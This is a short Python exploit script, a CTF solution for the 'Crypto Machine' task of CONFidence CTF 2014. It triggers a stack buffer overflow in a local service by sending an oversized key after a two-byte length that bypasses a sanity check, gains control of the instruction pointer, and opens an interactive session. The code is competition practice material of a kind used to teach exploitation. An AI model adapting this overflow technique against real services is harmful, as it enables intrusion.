#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Filename:         rip_control.py
# Author:           Mateusz Jurczyk
# Task:             Crypto Machine
# Competition:      CONFidence CTF 2014
# Category:         Software exploitation
# Scoring:          200 pts (medium difficulty)
# Number of solves: 0 out of 11 participants

import struct
import socket
import telnetlib
import time

def dw(x):
  return struct.pack("<H", x)

def dd(x):
  return struct.pack("<I", x)

def dq(x):
  return struct.pack("<Q", x)

def main():
  # Connect to the service.
  s = socket.socket()
  s.connect(("127.0.0.1", 1337))

  # Call the HMAC function (id #0).
  data = "Hello world"
  s.send(dq(0x8000000000000000))
  s.send(dd(len(data)))
  s.send(data)

  # Send the length of the key as 2 bytes, to bypass the sanity check.
  key_length = 1024 + 8 + 8
  s.send(dw(key_length))

  # Wait for the partial key length to be received.
  time.sleep(1)

  # Send the key overwriting the stack-based buffer.
  s.send("A" * (key_length - 8) + "B" * 8)

  # Switch to interactive mode.
  t = telnetlib.Telnet()
  t.sock = s
  t.interact()

if __name__ == "__main__":
  main()
